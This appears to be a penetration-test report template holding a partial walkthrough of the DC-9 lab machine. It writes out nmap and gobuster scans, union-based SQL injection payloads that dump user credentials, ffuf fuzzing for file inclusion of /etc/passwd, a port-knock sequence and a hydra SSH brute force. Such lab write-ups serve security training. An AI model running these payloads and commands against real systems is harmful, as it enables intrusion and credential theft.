- **Independent Challenges**
- **1 Target #1 – 192.168.133.168**
- **1.1 Initial Access –**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Steps to reproduce the attack:**

- **1.1 Service Enumeration**

└─# nmap -p- --min-rate=10000 192.168.133.168

![[DC-9 image.png]]

**Port Scan Results**

| **IP Address** | **Ports Open** |
| --- | --- |
| 192.168.133.168 | **TCP**: 22,80 |

└─# nmap -p22,80 -sC -sV -A --min-rate=10000 192.168.133.168 -Pn

![[DC-9 image 1.png]]

Port 22

filtered

Port 80

Apache 2.4.38

Directory Explore.

gobuster dir -u http://192.168.133.168 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip

![[DC-9 image 2.png]]

Browser Access

http://192.168.133.166

![[DC-9 image 3.png]]

**1.2** **Initial Access – Union Based SQL Injection & LFI**

' or 1=1 union select 1,2,3,user(),database(),version();#

![[DC-9 image 4.png]]

' or 1=1 union select 1,2,3,group_concat(schema_name),5,6 from information_schema.schemata;#

![[DC-9 image 5.png]]

' or 1=1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_name='Users';#

![[DC-9 image 6.png]]

' or 1=1 union select 1,2,group_concat(UserID),group_concat(Username),group_concat(Password),6 from Users;#

![[DC-9 image 7.png]]

' or 1=1 union select 1,2,3,group_concat(username),group_concat(password),6 from users.UserDetails;#

![[DC-9 image 8.png]]

![[DC-9 image 9.png]]

**File does not exist.**

**LFI**

![[DC-9 image 10.png]]

**Session ID.**

└─# ffuf -w /home/kali/github/burp-parameter-names.txt -u http://192.168.133.168/welcome.php?FUZZ=../../../../../../etc/passwd -b "PHPSESSID=s7a4u7qrq1uq8dg0319ei630vu" -fs 963

![[DC-9 image 11.png]]

**I found vulnerable parameter that name is file.**

![[DC-9 image 12.png]]

Check if SSH that was filtered when scanned with nmap can be released by port knocking.

![[DC-9 image 13.png]]

File does not exist

\[options\] UseSyslog \[openSSH\] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn \[closeSSH\] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn

─# knock 192.168.133.168 7469 8475 9842

![[DC-9 image 14.png]]

![[DC-9 image 15.png]]

└─# hydra -L user.txt -P passwd.txt 192.168.133.168 ssh

![[DC-9 image 16.png]]

└─# ssh chandlerb@192.168.133.168

![[DC-9 image 17.png]]

**1.3** **Privilege Escalation -**

**1.4** **Post Exploitation**

Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux

![[DC-9 image 18.png]]

su janitor

![[DC-9 image 19.png]]

![[DC-9 image 20.png]]

![[DC-9 image 21.png]]

![[DC-9 image 22.png]]

fredf@dc-9:/opt/devstuff$ cat test.py

#!/usr/bin/python

import sys

if len (sys.argv) != 3 :

print ("Usage: python test.py read append")

sys.exit (1)

else :

f = open(sys.argv\[1\], "r")

output = (f.read())

f = open(sys.argv\[2\], "a")

f.write(output)

f.close()

![[DC-9 image 23.png]]

![[DC-9 image 24.png]]

![[DC-9 image 25.png]]

![[DC-9 image 26.png]]

![[DC-9 image 27.png]]

**Proof.txt value:**

![[DC-9 image 28.png]]

- **Active Directory Set**

**Port Scan Results**

| **IP Address** | **Ports Open** |
| --- | --- |
|  | **TCP:** |
|  | **TCP:** |
|  | **TCP:** |

- **1  –**
- **1.1 Initial Access –**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:** **Critical**

**Steps to reproduce the attack:**

- **1.2 Privilege Escalation –**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:** **Critical**

**Steps to reproduce the attack:**

- **1.3 Post-Exploitation**

**System Proof screenshot:**

- **2  –**
- **2.1 Initial Access –**

**Steps to reproduce the attack:**

- **2.2 Post-Exploitation**

**Local Proof Screenshot:**

- **3 DC –**
- **5.3.1 Initial Access –**

**Steps to reproduce the attack:**

- **3.2 Post-Exploitation**

**System Proof Screenshot:**